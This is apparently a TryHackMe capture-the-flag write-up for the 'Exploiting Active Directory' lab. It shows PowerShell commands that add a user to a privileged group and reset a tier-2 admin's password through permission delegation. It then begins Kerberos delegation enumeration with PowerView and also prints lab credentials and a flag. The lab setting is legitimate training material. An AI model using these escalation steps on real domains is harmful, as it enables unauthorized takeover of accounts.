![Exploiting AD](https://assets.tryhackme.com/room-banners/attacking-ad.png)

## Exploiting Active Directory

### Exploiting Permission Delegation 

``` Your credentials have been generated: Username: laura.wood Password: C6j4BhcW ```


Bloodhound shows misconfiguration in AD allowing Domain Users to add themselves to IT Support, which in turn delegates permission to reset a t2 admin password

![bloodhound](/TryHackMe/Exploiting%20AD%20Task%202.png)

```posh
#Add our user to IT Support
Add-ADGroupMember "IT Support" -Members "laura.wood"
```

```posh
#Verify user has been successfully added
Get-ADGroupMember -Identity "IT Support" 
```

Run ``` gpupdate /force ```  then reconnect to the remote session to ensure permissions propogate

```posh
#Reset password for a user in 
$Password = ConvertTo-SecureString "Password1" -AsPlainText -Force
Set-ADAccountPassword -Identity "t2_caroline.dawson" -Reset -NewPassword $Password
```

RDP from AttackBox to locate the flag

``` THM{Permission.Delegation.FTW!} ```

### Exploiting Kerberos Delegation

```console
PS C:\Users\laura.wood> Import-Module C:\Tools\PowerView.ps1 
PS C:\Users\laura.wood> Get-NetUser -TrustedToAuth | select name, msds-allowedtodelegateto 

name       msds-allowedtodelegateto
----       ------------------------
IIS Server {WSMAN/THMSERVER1.za.tryhackme.loc, WSMAN/THMSERVER1, http/THMSERVER1.za.tryhackme.loc, http/THMSERVER1} 
```
